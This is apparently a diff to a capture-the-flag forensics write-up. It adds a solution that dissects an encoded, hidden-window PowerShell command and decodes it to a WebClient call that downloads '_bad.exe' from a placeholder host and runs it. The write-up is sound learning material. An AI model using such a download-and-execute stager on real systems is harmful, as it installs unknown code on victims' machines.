@@ -1,6 +1,6 @@
 # Forensics - 9 challenges
 [Magic in the Hex (100 pts)](#magic-in-the-hex-100-pts)<br>
-[My Logs Know What You Did (125 pts)](#my-logs-know-what-you-did-125-pts) *no soln*<br>
+[My Logs Know What You Did (125 pts)](#my-logs-know-what-you-did-125-pts)<br>
 [I Just Wanna Run (150 pts)](#i-just-wanna-run-150-pts) *no soln*<br>
 [Sharing Files and Passwords (150 pts)](#sharing-files-and-passwords-150-pts) *no soln*<br>
 [Still Believe in Magic? (150 pts)](#still-believe-in-magic-150-pts) *no soln*<br>
@@ -50,11 +50,25 @@ KDM
 > 
 > `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn`
 
+Looks like a simple powershell command. Dissecting the command:
+- `-noP` is short for `-NoProfile`: Does not load a PowerShell profile.
+- `-sta`: Starts PowerShell using a single-threaded apartment.
+- `-w 1` is short for `-WindowStyle <WindowStyleType>`, in this case the type 1 is `Hidden`: Hides the PowerShell window.
+- `-enc TmV..` is short for `-EncodedCommand <Base64EncodedCommand>`: Base64 encoded command.
+
+Decoding the encoded command:
+```
+$ echo "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn" | base64 -d
+New-Object System.Net.WebClient).DownloadFile('http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe','bad.exe');Start-Process 'bad.exe'
+```
+
+We get the powershell script the command executes. It downloads `http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe`, saves it as `bad.exe` and then runs it.
+
 <div align="center">
 
 Flag:
 ```
-NOT SOLVED YET
+MetaCTF{super_sus_st4ging_site_d0t_c0m}
 ```
 [return to top](#top)</div>
 
